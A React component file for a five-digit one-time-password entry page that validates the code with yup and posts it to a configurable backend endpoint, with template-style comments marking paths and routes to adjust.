import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import "../styles/otp.css"; // Create this CSS file based on your preferred styles
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg"; // Adjust the import path as needed
import axios from "axios";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  otp: yup
    .string()
    .matches(/^\d{5}$/, "OTP must be exactly 5 digits")
    .required("OTP is required"),
});

const Otp = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [otp, setOtp] = useState(new Array(5).fill(""));
  const [loading, setLoading] = useState(false);

  const handleChange = (element, index) => {
    const value = element.value;
    if (!/^\d$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (index < 4 && value !== "") {
      document.getElementById(`otp-${index + 1}`).focus();
    }

    setValue("otp", newOtp.join(""));
  };

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/otp`, data) // Adjust the endpoint as needed
      .then((response) => {
        console.log(response.data);
        reset(); // Reset react-hook-form
        setOtp(new Array(5).fill("")); // Clear the OTP input fields
        navigate("/otp"); // Replace with your desired route
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="otp">
      <div className="Otpcontainer">
        <div className="contentSec">
          <div className="title">Check Your Email</div>
          <p>
            Please enter the code we have sent to your email or Telegram Account
          </p>
        </div>
        <div className="formSec">
          <div className="input">
            <form onSubmit={handleSubmit(submitForm)}>
              <div className="formOtp">
                {otp.map((data, index) => (
                  <input
                    key={index}
                    id={`otp-${index}`}
                    type="text"
                    name="otp"
                    maxLength="1"
                    value={data}
                    onChange={(e) => handleChange(e.target, index)}
                    onFocus={(e) => e.target.select()}
                    className="otp-input"
                    inputMode="numeric"
                  />
                ))}
              </div>

              <FormErrMsg errors={errors} inputName="otp" />

              <div className="buttonSec">
                <button type="submit" disabled={loading}>
                  {loading ? "Verifying..." : "Continue"}
                </button>
              </div>
            </form>
          </div>
        </div>
        <div className="contentSec">
          <p>Can't access this email?</p>
        </div>
      </div>
    </div>
  );
};

export default Otp;
